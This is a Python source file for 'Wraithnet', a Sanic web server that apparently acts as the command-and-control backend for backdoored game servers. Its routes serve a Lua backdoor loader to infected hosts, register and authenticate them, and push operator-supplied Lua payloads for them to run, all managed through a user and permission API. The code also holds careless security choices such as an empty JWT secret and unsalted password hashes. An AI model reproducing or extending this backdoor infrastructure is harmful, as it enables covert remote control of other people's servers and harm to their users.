"""
----------------------------------------------
|               Wraithnet                    |
|       A project by LIES and Zultan         |
----------------------------------------------
"""

"""
----------------
|   Imports    |
----------------
"""
import json
import datetime
import base64
import jwt
import re
import hashlib
import uuid
import time
import operator

from datetime           import timedelta
from sanic              import Sanic, response
from sanic.response     import text, json
from peewee             import IntegrityError
from simplecrypt        import encrypt, decrypt
from valve.source.a2s   import ServerQuerier
from string             import Template
from binascii           import Error

from .modules.notification_module   import NotificationModule
from .modules.server_module         import ServerModule
from .modules.stub_module           import StubModule
from .modules.user_module           import UserModule
from .modules.user_module           import cleanDict

from .models.globals        import *
from .modules.helperfuncs   import *

JWT_SECRET = ""

app                              = Sanic(__name__)
#app.secret_key                  = ""
#app.permanent_session_lifetime  = timedelta(minutes=20)

"""
----------------------------
|  Frontend Routes (HTML)  |
----------------------------
"""

@app.route("/")
async def index(request):
    return text(":D?")

@app.route("/account/create", methods=["POST"])
async def newuser(request):
    username        = request.form.get("username")
    password        = request.form.get("password")
    emailAddress    = request.form.get("email")
    hwid            = request.form.get("hwid")

    if isNone(username, password, emailAddress, hwid):
        return Unsuccessful("Invalid Parameters")
    
    #emailMatch      = re.fullmatch(r"^[a-zA-Z0-9_+&*-]+(?:\.[a-zA-Z0-9_+&*-]+)*@(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,7}$", emailAddress)
    #usernameMatch   = re.fullmatch(r"^[a-zA-Z]+(([',. -][a-zA-Z ])?[a-zA-Z]*)*$", username)
    #passwordMatch   = re.fullmatch(r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{4,8}$", password)

    #if not emailMatch:
    #    return Unsuccessful("Invalid Email Address")
    
    #if not usernameMatch:
    #    return Unsuccessful("Invalid Username")
    
    #if not passwordMatch:
    #    return Unsuccessful("Invalid Password")

    try:
        UserModule.createUser({"username": username, "password": password, "email": emailAddress, "hwid": hwid})
    except IntegrityError:
        return Unsuccessful("Username Already Exists")
    else:
        return Successful()

@app.route("/account/login", methods=["POST"])
async def login(request):
    try:
        username = request.form.get("username")
        password = request.form.get("password")
        hwid     = request.form.get("hwid")

        if isNone(username, password, hwid):
            return Unsuccessful("Invalid Parameters")
            
        password = hashlib.sha256(request.form.get("password").encode()).hexdigest()

        currentUser = User.get((User.username == username) & (User.password == password))
    except User.DoesNotExist:
        return Unsuccessful("Incorrect Password / Username")
    else:
        if currentUser.hwid != hwid:
            return Unsuccessful("Unauthorised - Invalid HWID")

        return Successful()


"""
-------------------------
|    User API Routes    |
-------------------------
"""
@app.route("/api/token/get", methods=["POST"])
async def gettoken(request):
    try:
        username    = request.form.get("username")
        password    = request.form.get("password")
        hwid        = request.form.get("hwid")

        if isNone(username, password, hwid):
            return Unsuccessful("Invalid Parameters")
        
        password = hashlib.sha256(password.encode()).hexdigest()

        userModel = User.get(
            (User.username == username) &
            (User.password == password)
        )
    except User.DoesNotExist:
        return Unsuccessful("Invalid Username / Password")
    else:
        userHwid = userModel.hwid
        if hwid != userHwid:
            return Unsuccessful("Unauthorised - Invalid HWID")

        payload = {"uuid": userModel.uuid, "username": username, "time": time.time()}
        apiToken = jwt.encode(payload, JWT_SECRET)
        return SuccessfulContent(str(apiToken)[2:-1])

@app.route("/api/user/valid", methods=["POST"])
async def valid(request):
    userUUID = request.form.get("uuid")
    module = UserModule(userUUID)

    if module.validUid():
        return Successful()
    else:
        return Unsuccessful("Invalid")

@app.route("/api/user/all", methods=["POST"])
@validate_token
async def getusers(request):
    token   = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    module  = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")
        
    if not module.hasPermission("list_users"):
        return Unsuccessful("Unauthorised")
        
    userList = module.allUsers()
    return SuccessfulContent(userList)

@app.route("/api/user/get", methods=["POST"])
@validate_token
async def getuser(request):
    token   = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])

    module = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    userUid = request.form.get("user_uid")

    if not module.hasPermission("list_users") and userUid != payload["uuid"]:
        return Unsuccessful("Unauthorised")
    
    try:
        selectedUser = User.get(User.uuid == userUid)
    except User.DoesNotExist:
        return Unsuccessful("Invalid User")
    else:
        return SuccessfulContent(cleanDict(selectedUser.__dict__))

@app.route("/api/user/self", methods=["POST"])
@validate_token
async def getself(request):
    token = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])

    module = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    selectedUser = User.get(User.uuid == payload["uuid"])
    return SuccessfulContent(cleanDict(selectedUser.__dict__))

@app.route("/api/user/pending/get", methods=['POST'])
@validate_token
async def unregistered(request):
    token   = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    module  = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("list_users"):
        return Unsuccessful("Unauthorised")
    
    pendingUsers = UserModule.getPendingdUsers()
    return SuccessfulContent(pendingUsers)

@app.route("/api/user/permissions/get", methods=['POST'])
@validate_token
async def permissions(request):
    token   = request.form.get("api_token").encode()
    payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    module  = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("view_permissions"):
        return Unsuccessful("Unauthorised")
    
    userUid = request.form.get("user_uid")
    module = UserModule(userUid)

    if not module.validUid():
        return Unsuccessful("Invalid User Supplied")
    
    userPermissions = module.getUser().permissions.__dict__
    return SuccessfulContent(userPermissions)

@app.route("/api/user/servers/active", methods=["POST"])
@validate_token
async def activeservers(request):
    token = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    module = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")

    if not module.hasPermission("list_servers"):
        return Unsuccessful("Unauthorised")
    
    userModel = User.get(User.uuid == payload["uuid"])
    stubUids = [Stub.uid for Stub in Stub.select().where(Stub.owner == userModel)]
    serverList = Server.select().where(Server.stub.uid in stubUids)
    activeServerList = []
    for serverRecord in serverList:
        deltaObj = datetime.datetime.now() - serverRecord.last_auth
        duration = deltaObj.total_seconds()

        if  duration <= 20:
            activeServerList.append(serverRecord)

    return SuccessfulContent([Server.__dict__ for Server in activeServerList])


@app.route("/api/user/servers/all", methods=["POST"])
@validate_token
async def allservers(request):
    token = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    module = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")

    if not module.hasPermission("list_servers"):
        return Unsuccessful("Unauthorised")
    
    userModel = User.get(User.uuid == payload["uuid"])
    stubUids = [Stub.uid for Stub in Stub.select().where(Stub.owner == userModel)]
    serverList = Server.select().where(Server.stub.uid in stubUids)
    return SuccessfulContent([Server.__dict__ for Server in serverList])

@app.route("/api/user/servers/refresh", methods=["POST"])
@validate_token
async def refreshservers(request):
    token = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    module = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("list_servers"):
        return Unsuccessful("Unauthorised")

    userModel = User.get(User.uuid == payload["uuid"])
    stubUids = [Stub.uid for Stub in Stub.select().where(Stub.owner == userModel)]
    serverList = Server.select().where(Server.stub.uid in stubUids)
    inactiveServerList = []
    for serverRecord in serverList:
        deltaObj = datetime.datetime.now() - serverRecord.last_auth
        duration = deltaObj.total_seconds()

        if  duration > 10:
            Server.delete().where(Server.uid == serverRecord.uid).execute()

    return Successful()

@app.route("/api/user/permissions/update", methods=['POST'])
@validate_token
async def updatepermisions(request):
    token   = request.form.get("api_token").encode()
    payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    module  = UserModule(payload["uuid"])

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("update_permissions"):
        return Unsuccessful("Unauthorised")
    
    userUid          = request.form.get("user_uid")
    permissionName   = request.form.get("name")
    permissionValue  = request.form.get("value")
    
    module = UserModule(userUid)

    if not module.validUid():
        return Unsuccessful("Invalid User Supplied")
    
    if permissionValue.lower() not in ["true", "false"]:
        return Unsuccessful("Invalid Permission Value Supplied")

    if not validPermission(permissionName):
       return Unsuccessful("Invalid Permission name")
    
    permissionValue = tobool(permissionValue)

    module.updatePermissions({permissionName: permissionValue})
    return Successful()


@app.route("/api/user/password/reset", methods=['POST'])
async def resetpassword(request):
    try:
        passwordResetToken  = request.form.get("reset_token")
        
        if isNone(passwordResetToken):
            return Unsuccessful("Invalid Parameters")

        payload = jwt.decode(passwordResetToken.encode(), JWT_SECRET, algorithms=["HS256"])
    except PyJWTError:
        return Unsuccessful("Invalid Token")
    else:
        emailAddress    = payload['email']
        userModel       = User.get(User.email == emailAddress)
        userUid         = userModel.uuid

        module = UserModule(userUid)
        
        if not module.validUid():
            return Unsuccessful("Invalid User")
    
        newPassword = request.form.get("new_password")
        newPasswordHashed = hashlib.sha256(newPassword.encode()).hexdigest()

        if newPasswordHashed == userModel.password:
            return Unsuccessful("Cannot use old password")

        User.update(password=newPasswordHashed).where(User.uuid == userUid).save()
        return Successful()

@app.route("/api/user/ban", methods=['POST'])
@validate_token
async def banuser(request):
    token   = request.form.get("api_token").encode()
    payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    userUid = payload["uuid"]

    module = UserModule(userUid)

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("ban_user"):
        return Unsuccessful("Unauthorised")
    
    userUid = request.form.get("user_uid")
    reason = request.form.get("reason")
    
    module.banUser(userUid, reason)
    return Successful()

@app.route("/api/user/unban", methods=['POST'])
@validate_token
async def unbanuser(request):
    token     = request.form.get("api_token").encode()
    payload   = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    userUid   = payload["uuid"]

    module = UserModule(userUid)

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("unban_user"):
        return Unsuccessful("Unauthorised")
    
    userUid = request.form.get("user_uid")

    module.unbanUser(userUid)
    return Successful()

"""
--------------------------------------------
|       Server Routes                      |
--------------------------------------------
"""
@app.route("/api/stub/create", methods=["POST"])
@validate_token
async def createstub(request):
    token    = request.form.get("api_token")
    payload  = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    userUid  = payload["uuid"]

    module = UserModule(userUid)

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("create_stub"):
        return Unsuccessful("Unauthorised")
    
    newStubObject = StubModule.createStub(userUid)
    return SuccessfulContent(newStubObject)

@app.route("/api/server/execute", methods=["POST"])
@validate_token
async def executelua(request):
    token = request.form.get("api_token")
    payload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    userUid = payload["uuid"]

    module = UserModule(userUid)

    if not module.validUid():
        return Unsuccessful("Invalid User")
    
    if not module.hasPermission("create_stub"):
        return Unsuccessful("Unauthorised")
    
    luaPayload = request.form.get("lua_payload")

    if luaPayload is None:
        return Unsuccessful("Invalid Payload")
    
    if not validBase64(luaPayload):
        return Unsuccessful("Invalid Base64")
    
    luaPayload = base64.b64decode(luaPayload)
    
    instance = str(uuid.uuid4())
    serverUid = request.form.get("server_uid")
    
    try:
        Server.get(Server.uid == serverUid)
    except Server.DoesNotExist:
        return Unsuccessful("Server does not exist")
    else:
        Server.update(payload=luaPayload, payload_instance=instance).where(Server.uid == serverUid).execute()
        return Successful()

@app.route("/loader/<sid>", methods=["GET"]) #Stub Lua grabs and runs this which runs the actual backdoor code
async def getloader(request, sid):
    if type(sid) is not str:
        return Unsuccessful("Invalid Type")
    
    if not stubExists(sid):
        return Unsuccessful("Invalid SID")
    
    backdoorCode = Loader.get(Loader.id == 2).code
    t = Template(backdoorCode)
    backdoorCodeSubstituted = t.substitute({"sid": sid})
    return text(backdoorCodeSubstituted)

@app.route("/server/initial", methods=["POST"]) #For initial auth if server model needs to be created
async def initial(request):
    sid     = request.form.get('sid')
    ipStr   = request.form.get("ip")

    if isNone(sid, ipStr):
        return Unsuccessful("Invalid Params")

    try:
        stubModel = Stub.get(Stub.sid == sid)
    except Stub.DoesNotExist:
        return Unsuccessful("Invalid SID")
    else: 
        ip = ipStr.split(":")[0]
        port = int(ipStr.split(":")[1])

        if not serverExists(ip, port):
            defaultPayload = "if true then return end"
            Server.create(ip=ip, port=port, stub=stubModel, uid = str(uuid.uuid4()), last_auth=datetime.datetime.now(), payload=defaultPayload, payload_instance=str(uuid.uuid4()))
            return Successful()
        else:
            return Unsuccessful("Server Already Exists")

@app.route("/server/auth", methods=["POST"]) #For auth (jwt return)
async def auth(request):
    requestBody = { #sanitize these for the love of god
        "sid":  request.form.get("sid"),
        "ip":   request.form.get("ip")
    }

    if isNone(requestBody["sid"], requestBody["ip"]):
        return Unsuccessful("Invalid Parameters")
    
    if not stubExists(requestBody["sid"]):
        return Unsuccessful("Invalid SID")
    
    serverIp = requestBody['ip'].split(":")[0]
    serverPort = int(requestBody["ip"].split(":")[1])

    if not serverExists(serverIp, serverPort):
        return Unsuccessful("Server Does Not Exist")

    serverModel = Server.get((Server.ip == serverIp) & (Server.port == serverPort))
    stubModel   = serverModel.stub
    
    payload = {"owner": stubModel.owner.uuid, "stub": stubModel.uid, "time": time.time(), "server": serverModel.uid}
    token   = jwt.encode(payload, JWT_SECRET)
    return SuccessfulContent(str(token)[2:-1])

@app.route("/server/ping", methods=["POST"])
async def ping(request):
    token = request.form.get("token")
    
    tokenStatus = JWTStatus(getJwtStatus(token)).name

    if not tokenStatus == "NORMAL":
        return Unsuccessful(tokenStatus)
    
    jsonPayload = jwt.decode(token.encode(), JWT_SECRET, algorithms=["HS256"])
    serverModel = Server.get(Server.uid == jsonPayload["server"])
    Server.update(last_auth = datetime.datetime.now()).where(Server.uid == jsonPayload["server"]).execute()

    return json({
        "success": True,
        "error": False,
        "content": {
            "instance": serverModel.payload_instance,
            "payload": serverModel.payload
        }
    })

@app.route("/update_lua", methods=['POST'])
async def updatelua(request):
    secretKey = request.form.get("key")

    if secretKey is None:
        return Unsuccessful("Invalid Key")

    if secretKey != JWT_SECRET:
        return Unsuccessful("Unauthorised")
    
    backdoorCode = open("./wraithnet/lua/backdoor.lua").read()
    Loader.update(code=backdoorCode).where(Loader.id == 2).execute()
    return Successful()
